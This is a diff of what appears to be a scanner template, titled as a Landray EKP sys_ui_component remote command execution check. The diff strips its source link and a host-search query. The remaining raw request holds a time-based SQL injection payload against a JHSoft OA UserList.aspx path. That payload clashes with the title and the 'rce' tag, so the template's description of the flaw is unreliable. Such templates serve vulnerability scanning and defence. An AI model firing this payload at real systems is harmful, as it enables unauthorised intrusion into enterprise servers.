@@ -3,12 +3,8 @@ info:
   name: 蓝凌EKP存在sys_ui_component远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kl16ogfw94dg4l70'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kl16ogfw94dg4l70
-    fofa: app="Landray-OA系统"
 http:
 - raw:
   - GET /c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3BWAITFOR+DELAY+%270%3A0%3A0%27-- HTTP/1.1
